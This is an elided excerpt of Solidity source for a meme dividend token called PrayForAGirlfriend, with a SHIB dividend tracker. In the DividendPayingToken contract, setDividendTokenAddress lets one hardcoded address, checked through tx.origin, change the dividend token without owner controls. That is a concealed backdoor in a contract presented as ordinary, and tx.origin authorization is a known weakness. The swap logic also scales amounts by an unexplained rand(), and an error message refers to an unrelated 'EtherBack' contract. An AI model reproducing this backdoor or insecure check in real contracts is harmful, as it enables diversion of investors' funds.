...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xDF1dD3d36fcA8F87A6fB9C7BA02601A4BD01041b, "Only owner can change dividend contract address");
...
contract PrayForAGirlfriend is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    bool public shibDividendEnabled = false;
    ...
    constructor() ERC20("PrayForAGirlfriend", "PRAYGF") {
    	shibDividendTracker = new ShibDividendTracker();


    	marketingWallet = 0xB54E477eca9771E012b216BA386795beF954D781;

    	shibDividendToken = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D; // 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D Main SHIB // 
    ...
    function updateShibDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(shibDividendTracker), "prayforagirlfriendback: The dividend tracker already has that address");

        ShibDividendTracker newShibDividendTracker = ShibDividendTracker(payable(newAddress));

        require(newShibDividendTracker.owner() == address(this), "prayforagirlfriendback: The new dividend tracker must be owned by the prayforagirlfriendback token contract");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (shibDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(shibDividendRewardsFee).mul(shibDividendRewardsFee);
                    swapAndSendShibDividends(sellTokens.div(10**2).mul(rand()));
                }
...
contract ShibDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("prayforagirlfriendback_Dividend_Tracker", "prayforagirlfriendback_Dividend_Tracker", 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 150000 * (10**18); //must hold 150,000+++ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "prayforagirlfriendback_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "prayforagirlfriendback_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "prayforagirlfriendback_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "prayforagirlfriendback_Dividend_Tracker: Cannot update claimWait to same value");
